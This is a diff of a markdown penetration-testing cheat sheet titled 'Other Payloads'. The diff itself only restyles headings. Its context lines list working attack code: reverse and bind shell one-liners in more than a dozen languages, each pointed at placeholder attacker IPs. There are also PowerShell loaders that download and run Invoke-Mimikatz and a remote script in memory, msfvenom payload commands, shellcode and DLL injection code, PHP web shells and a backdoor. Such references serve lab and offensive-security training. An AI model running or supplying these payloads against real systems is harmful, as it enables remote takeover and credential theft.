@@ -1,10 +1,10 @@
 # ⭕ Other Payloads
 
-## Web Shells
+## <mark style="color:red;">Web Shells</mark>
 
 The following shells exist within Kali Linux, under /usr/share/webshells/ these are only useful if you are able to upload, inject or transfer the shell to the machine.
 
-### weevely payloads
+### <mark style="color:orange;">weevely payloads</mark>
 
 generate:
 
@@ -30,7 +30,7 @@ dump sql database with weevely:
 sql_dump -vector mysqldump_sh -host localhost -lpath /root/dvwa-data.txt db name] [user] [passwd]
 ```
 
-### Kali PHP Web Shells
+### <mark style="color:orange;">Kali PHP Web Shells</mark>
 
 Kali PHP reverse shells and command shells:
 
@@ -45,7 +45,7 @@ Kali PHP reverse shells and command shells:
 The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.
 {% endhint %}
 
-### Kali Perl Reverse Shell
+### <mark style="color:orange;">Kali Perl Reverse Shell</mark>
 
 Kali perl reverse shell:\\
 
@@ -54,7 +54,7 @@ Kali perl reverse shell:\\
 | /usr/share/webshells/perl/ perl-reverse-shell.pl | Pen Test Monkey - Perl Reverse Shell                                              |
 | /usr/share/webshells/ perl/perlcmd.cgi           | Pen Test Monkey, Perl Shell. Usage: http://target.com/perlcmd.cgi?cat /etc/passwd |
 
-### Kali Cold Fusion Shell
+### <mark style="color:orange;">Kali Cold Fusion Shell</mark>
 
 Kali Coldfusion Shell:
 
@@ -62,7 +62,7 @@ Kali Coldfusion Shell:
 | ----------------------------------- | --------------------------------- |
 | /usr/share/webshells/cfm/cfexec.cfm | Cold Fusion Shell - aka CFM Shell |
 
-### Kali ASP Shell
+### <mark style="color:orange;">Kali ASP Shell</mark>
 
 Classic ASP Reverse Shell + CMD shells:
 
@@ -70,7 +70,7 @@ Classic ASP Reverse Shell + CMD shells:
 | ------------------------- | --------------- |
 | /usr/share/webshells/asp/ | Kali ASP Shells |
 
-### Kali ASPX Shells
+### <mark style="color:orange;">Kali ASPX Shells</mark>
 
 ASP.NET reverse shells within Kali
 
@@ -78,7 +78,7 @@ ASP.NET reverse shells within Kali
 | -------------------------- | ---------------- |
 | /usr/share/webshells/aspx/ | Kali ASPX Shells |
 
-### Kali JSP Reverse Shell
+### <mark style="color:orange;">Kali JSP Reverse Shell</mark>
 
 Kali JSP Reverse Shell:
 
@@ -86,15 +86,15 @@ Kali JSP Reverse Shell:
 | ---------------------------------------- | ---------------------- |
 | /usr/share/webshells/jsp/jsp-reverse.jsp | Kali JSP Reverse Shell |
 
-## Powershell
+## <mark style="color:red;">Powershell</mark>
 
-### load script in memory
+### <mark style="color:orange;">load script in memory</mark>
 
 ```
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1') ;
 ```
 
-### Proxy-aware Load in Memory with User Agent
+### <mark style="color:orange;">Proxy-aware Load in Memory with User Agent</mark>
 
 ```
 New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
@@ -114,7 +114,7 @@ IEX()$wc.DownloadString("http://192.168.56.1/run.ps1")
 New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null;$keys = Get-ChildItem 'HKU:\';ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}};$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer;[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr");$wc = new-object system.net.WebClient;$wc.Headers.Add('User-Agent', "RELPACE THIS");IEX($wc.DownloadString("http://192.168.56.1/run.ps1"))
 ```
 
-### PowerShell Reverse Shells
+### <mark style="color:orange;">PowerShell Reverse Shells</mark>
 
 setup a netcat listener:
 
@@ -146,7 +146,7 @@ one-liner:
 powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',6969);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-### PowerShell Bind Shells
+### <mark style="color:orange;">PowerShell Bind Shells</mark>
 
 ```
 powershell  -ep bypass -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',6666);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
@@ -162,7 +162,7 @@ now we connect to the listener with nc:
 nc [ip] [port] 
 ```
 
-### in memory injection
+### <mark style="color:orange;">in-memory injection</mark>
 
 ```
 $code = '
@@ -190,9 +190,9 @@ $winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
 ```
 
-## Bash&#x20;
+## <mark style="color:red;">Bash</mark>&#x20;
 
-### Bash Reverse
+### <mark style="color:orange;">Bash Reverse</mark>
 
 ```
 # attacker:
@@ -205,7 +205,7 @@ cat <&5 | while read line; do $line 2>&5 >&5; done
 0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
 ```
 
-### Bash UDP
+### <mark style="color:orange;">Bash UDP</mark>
 
 ```
 Victim:
@@ -215,7 +215,7 @@ Listener:
 nc -u -lvp 4242
 ```
 
-### mknod Reverse Shell
+### <mark style="color:orange;">mknod Reverse Shell</mark>
 
 ```
 nc -nvlp 6666 → attacker
@@ -223,7 +223,7 @@ nc -nvlp 6666 → attacker
 mknod /tmp/backpipe p; /bin/sh 0< /tmp/backpipe | nc 192.168.56.1 6666 1> /tmp/backpipe → victim
 ```
 
-## Netcat
+## <mark style="color:red;">Netcat</mark>
 
 ```
 msfvenom -p cmd/unix/reverse_netcat lhost=0.0.0.0 lport=9999 R → auto generate, can be perl or python instead of netcat
@@ -233,7 +233,7 @@ mkfifo /tmp/lnyzdr; nc 0.0.0.0 9999 0</tmp/lnyzdr | /bin/sh >/tmp/lnyzdr 2>&1; r
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p
 ```
 
-### without -e option
+### <mark style="color:orange;">without -e option</mark>
 
 for freeBSD version of netcat without -e (command execution) option:
 
@@ -241,13 +241,13 @@ for freeBSD version of netcat without -e (command execution) option:
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 192.168.5.1 5555 >/tmp/f
 ```
 
-### Busy Box
+## <mark style="color:red;">Busy Box</mark>
 
 ```
 rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
 ```
 
-## Ncat
+## <mark style="color:red;">Ncat</mark>
 
 ```
 ncat --udp -lvp 4242
@@ -255,7 +255,7 @@ ncat --sctp -lvp 4242
 ncat --tcp -lvp 4242
 ```
 
-## OpenSSL
+## <mark style="color:red;">OpenSSL</mark>
 
 Attacker:
 
@@ -280,7 +280,7 @@ export LHOST="*"; export LPORT="4242"; export PSK="replacewithgeneratedpskfromab
 export RHOST="10.0.0.1"; export RPORT="4242"; export PSK="replacewithgeneratedpskfromabove"; export PIPE="/tmp/`openssl rand -hex 4`"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE
 ```
 
-## Groovy
+## <mark style="color:red;">Groovy</mark>
 
 ```
 String host="10.0.0.1";
@@ -289,20 +289,20 @@ String cmd="/bin/sh";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-## AWK
+## <mark style="color:red;">AWK</mark>
 
 ```
 awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
 
-## WAR
+## <mark style="color:red;">WAR</mark>
 
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
 ```
 
-## GHAWK
+## <mark style="color:red;">GHAWK</mark>
 
 ```
 #!/usr/bin/gawk -f
@@ -327,16 +327,16 @@ BEGIN {
 }
 ```
 
-## Powercat
+## <mark style="color:red;">Powercat</mark>
 
-### Powercat Bind Shells
+### <mark style="color:orange;">Powercat Bind Shells</mark>
 
 ```
 powercat -l -p 443 -e cmd.exe
 nc 10.11.0.22 443
 ```
 
-### Powercat Stand-Alone Payloads
+### <mark style="color:orange;">Powercat Stand-Alone Payloads</mark>
 
 In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user
 
@@ -365,16 +365,16 @@ The file will contain an encoded string that can be executed using the PowerShel
 powershell.exe -E [code]
 ```
 
-## Python
+## <mark style="color:red;">Python</mark>
 
-### for Linux
+### <mark style="color:orange;">for Linux</mark>
 
 ```
 export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  
 ```
 
-#### IPv6
+#### <mark style="color:green;">IPv6</mark>
 
 ```
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
@@ -382,7 +382,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-#### Script
+#### <mark style="color:green;">Script</mark>
 
 ```
 #!/usr/bin/env python
@@ -398,7 +398,7 @@ os.dup2(s.fileno(),2)
 p=subprocess.call(["/bin/sh","-i"])
 ```
 
-### for Windows
+### <mark style="color:orange;">for Windows</mark>
 
 ```
 exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
@@ -410,7 +410,7 @@ or
 python -c 'exec("""import os, socket, subprocess, threading, sys\ndef s2p(s, p):\n    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()\ndef p2s(s, p):\n    while True: s.send(p.stdout.read(1).encode())\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nwhile True:\n    try: s.connect(("10.0.0.1",666)); break\n    except: pass\np=subprocess.Popen(["powershell.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)\nthreading.Thread(target=s2p, args=[s,p], daemon=True).start()\nthreading.Thread(target=p2s, args=[s,p], daemon=True).start()\ntry: p.wait()\nexcept: s.close(); sys.exit(0)""")
 ```
 
-#### Script
+#### <mark style="color:green;">Script</mark>
 
 ```
 import os, socket, subprocess, threading, sys
@@ -441,7 +441,7 @@ except KeyboardInterrupt:
     s.close()
 ```
 
-## C language
+## <mark style="color:red;">C language</mark>
 
 ```
 #include <stdio.h>
@@ -533,7 +533,7 @@ int main(int argc, char *argv[])
 }
 ```
 
-### DLL injection
+## <mark style="color:red;">DLL injection</mark>
 
 ```
 apt install mingw32-gcc-c++.x86_64
@@ -558,7 +558,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 }
 ```
 
-## Xterm
+## <mark style="color:red;">Xterm</mark>
 
 ```
 xterm -display 10.0.0.1:1 → host
@@ -568,7 +568,7 @@ Xnest :1 → attacker allow connection
 xhost +targetip → attacker
 ```
 
-## Telnet
+## <mark style="color:red;">Telnet</mark>
 
 ```
 rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
@@ -576,30 +576,30 @@ rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p
 telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 ```
 
-## Socat
+## <mark style="color:red;">Socat</mark>
 
-### connect
+### <mark style="color:orange;">connect</mark>
 
 ```
 socat - TCP4:[ip]:[port] 
 socat TCP4-LISTEN:[port] STDOUT
 ```
 
-### file transfer
+### <mark style="color:orange;">file transfer</mark>
 
 ```
 sudo socat TCP4-LISTEN:443,fork file:file.txt
 socat TCP4:18.11.8.4:443 file:file.txt,create
 ```
 
-### reverse shell
+### <mark style="color:orange;">reverse shell</mark>
 
 ```
 socat -d -d TCP4-LISTEN:443 STDOUT
 socat TCP4:18.11.8.22:443 EXEC:/bin/bash
 ```
 
-### Encrypted Bind Shells
+### <mark style="color:orange;">Encrypted Bind Shells</mark>
 
 ​​create a cert with openssl:
 
@@ -629,20 +629,20 @@ socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=e,fork EXEC:/bin
 socat - OPENSSL:1e.11. e .4:443,verify=8
 ```
 
-### intractive shell
+### <mark style="color:orange;">intractive shell</mark>
 
 ```
 socat file:`tty`,raw,echo=0 tcp-listen:4444 → attacker
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  → host
 ```
 
-## Ruby
+## <mark style="color:red;">Ruby</mark>
 
 ```
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'  
 ```
 
-## Dart
+## <mark style="color:red;">Dart</mark>
 
 ```
 import 'dart:io';
@@ -665,7 +665,7 @@ main() {
 }
 ```
 
-## NodeJS
+## <mark style="color:red;">NodeJS</mark>
 
 ```
 (function(){
@@ -697,7 +697,7 @@ https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 
 ```
 
-## LUA
+## <mark style="color:red;">LUA</mark>
 
 Linux only
 
@@ -711,33 +711,33 @@ Windows and Linux
 lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 
-## Golang
+## <mark style="color:red;">Golang</mark>
 
 ```
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 
-## PHP
+## <mark style="color:red;">PHP</mark>
 
-### php reverse shell
+### <mark style="color:orange;">php reverse shell</mark>
 
 {% embed url="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" %}
 
-### PHP in web pages
+### <mark style="color:orange;">PHP in web pages</mark>
 
-#### linux
+#### <mark style="color:green;">linux</mark>
 
 ```
 <?php echo shell_exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/666 0>&1'")?>
 ```
 
-#### windows
+#### <mark style="color:green;">windows</mark>
 
 ```
 <?php echo shell_exec("powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',5555);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -Name System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"")?>
 ```
 
-### php one-liner
+### <mark style="color:orange;">PHP one-liner</mark>
 
 This code assumes that the TCP connection uses file descriptor 3.f it doesn’t work, try 4, 5, 6…
 
@@ -767,7 +767,7 @@ message=test;system(‘ls -la’);
 <?php -r '$sock=fsockopen(10.11.0.220",1234);exec("/bin/sh -i <&d >&%d 2>&%d",f,f,f)' ?>
 ```
 
-#### Simple PHP Backdoor By DK (One-Liner Version)
+#### <mark style="color:green;">Simple PHP Backdoor By DK (One-Liner Version)</mark>
 
 Usage:
 
@@ -780,14 +780,14 @@ http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 php -r '$sock=fsockopen(10.11.0.220",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### msfvenom
+### <mark style="color:orange;">msfvenom</mark>
 
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.php
 msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw > phpreverseshell.php
 ```
 
-### shell.php
+### <mark style="color:orange;">shell.php</mark>
 
 ```
 <?php
@@ -940,7 +940,7 @@ print "$string\n";
 ?>
 ```
 
-## JAVA
+## <mark style="color:red;">JAVA</mark>
 
 ```
 r = Runtime.getRuntime()
@@ -956,19 +956,19 @@ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.
 
 
 
-## Perl
+## <mark style="color:red;">Perl</mark>
 
-#### Save this as a CGI file: - you can always just use a command line as well
+#### <mark style="color:green;">Save this as a CGI file: - you can always just use a command line as well</mark>
 
 ```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-### perl-reverse-shell
+### <mark style="color:orange;">perl-reverse-shell</mark>
 
 ​​[http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)
 
-### Perl Windows Reverse Shell
+### <mark style="color:orange;">Perl Windows Reverse Shell</mark>
 
 ```
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
